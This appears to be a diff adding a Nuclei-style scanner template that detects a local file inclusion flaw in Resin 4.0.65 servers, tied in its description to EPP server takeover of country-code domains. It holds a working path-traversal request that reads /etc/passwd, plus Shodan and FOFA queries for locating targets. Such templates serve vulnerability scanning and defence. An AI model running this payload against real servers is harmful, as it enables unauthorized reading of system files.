@@ -1,0 +1,31 @@
+id: Resin-lfi
+
+info:
+  name: Resin LFI Detect
+  author: rix4uni
+  severity: high
+  description: Vulnerabilities in EPP servers that could lead to takeover of ccTLDs like .ai, .bj, .bw, .ci, .gl, .ke, .kn, etc.
+  reference:
+    - https://twitter.com/payloadartist/status/1668626783590301696
+    - https://hackcompute.com/hacking-epp-servers
+  metadata:
+    shodan-query:
+      - "Server: Resin/4.0.65"
+    fofa-query:
+      - "Server: Resin/4.0.65"
+  tags: lfi,Resin-lfi,Resin
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/cities?country=/../../../../../../../../etc/passwd'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          
+      - type: status
+        status:
+          - 200
